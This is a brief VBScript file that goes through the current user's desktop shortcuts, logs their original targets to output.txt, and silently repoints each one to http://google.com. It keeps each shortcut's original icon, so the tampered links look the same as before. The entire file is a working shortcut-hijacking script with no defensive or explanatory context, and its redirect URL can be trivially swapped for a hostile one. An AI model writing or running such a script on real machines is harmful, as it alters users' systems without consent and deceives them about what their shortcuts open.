' Shell
Set sh = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Desktop Location
deskPath = sh.SpecialFolders("Desktop")
Set desk = objFSO.GetFolder(deskPath)

' Output File
result = deskPath & "\output.txt"
Set outFile = objFSO.CreateTextFile(result, True)

' Look for Shortcuts and Change When Found
For Each File In desk.Files
    ' WHEN TESTING, ADD OTHER RESTRICTIONS HERE
    If File.Type = "Shortcut" Then
        originalTarget = sh.CreateShortcut(File).TargetPath
        outFile.Write  File.Name &  ": " & originalTarget  & vbCrLf
        Set shortcut = sh.CreateShortcut(deskPath + "\" + File.Name)
        ' Redirect
        shortcut.TargetPath = "http://google.com"
        shortcut.IconLocation = originalTarget
        shortcut.Save
    End If
Next
outFile.Close

